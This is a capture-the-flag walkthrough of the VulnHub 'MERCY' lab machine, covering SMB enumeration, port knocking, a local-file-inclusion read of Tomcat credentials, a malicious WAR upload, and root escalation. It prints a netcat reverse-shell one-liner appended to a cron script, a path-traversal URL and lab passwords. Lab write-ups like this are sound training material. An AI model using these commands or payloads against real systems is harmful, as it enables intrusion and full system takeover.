# digitalworld.local: MERCY

[VulnHub Link](https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/)

## Port Scanning

We start with a simple port scan and we discover a bunch of open ports:

```
PORT     STATE SERVICE     VERSION
53/tcp   open  domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
110/tcp  open  pop3        Dovecot pop3d
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open  imap        Dovecot imapd (Ubuntu)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open  ssl/imap    Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3    Dovecot pop3d
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
|_http-title: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Potentially risky methods: PUT DELETE
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

After enumerating http and dns we found nothing but we can still try finding useful info in smb. After a bit enumerating we found four users:

```
pleadformercy                                                            
qiu
thisisasuperduperlonguser
fluffy
```

There was an http page which was telling us about a story of a weak password so we can try connect to smb with the password as same as the user: `smbclient \\\\digitalworld.local\\qiu -U qiu` We foud a entrance! After a bit enumerating we found that port knocking is activated.

```
 [openHTTP]
        sequence    = 159,27391,4
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[closeHTTP]
        sequence    = 4,27391,159
        seq_timeout = 100
        command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
        tcpflags    = syn

[openSSH]
        sequence    = 17301,28504,9999
        seq_timeout = 100
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn

[closeSSH]
        sequence    = 9999,28504,17301
        seq_timeout = 100
        command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
        tcpflags    = syn
```

Now we can use knockd for open the ports:

```
knock -v digitalworld.local 159 27391 4
knock -v digitalworld.local 17301 28504 9999
```

As we can see we opened the ports!

```
22/tcp open  ssh
80/tcp open  http
```

As soon as we open the http server on port 80 we discovery that there is nothing useful, after we tried /robots.txt we saw that 2 entries are disallowed:

```
User-agent: *
Disallow: /mercy
Disallow: /nomercy
```

One of the disallowed entries (/nomercy) is a "Rips 0.53" service where we found that there is a LFI vulnerability (https://www.exploit-db.com/papers/12886). After a bit of enumeration on the system i tried: `http://digitalworld.local/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml` because on the first page in the server on the port 8080 there was a string that i remembered: `NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat7/tomcat-users.xml.`

Now we have 2 another users and passwords! `thisisasuperduperlonguser:heartbreakisinevitable` `fluffy:freakishfluffybunny`

With this combination we can access `http://digitalworld.local:8080/manager/html` and upload a malicious .war file, we now have a shell!

## Privesc

As soon as we enter we privesc on fluffy with the found credentials. In the "/home/fluffy/.private/secrets/" we have a "timeclock" shell file, maybe is a hidden cronjob. We can try because we can write into it:

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.40.139 9000 >/tmp/f" >> timeclock
```

As we said, we now have a root shell! `uid=0(root) gid=0(root) groups=0(root)`

## That's was a really cool box and thanks for the reading.

## Hope to see you soon!

_Pedio Zaki_
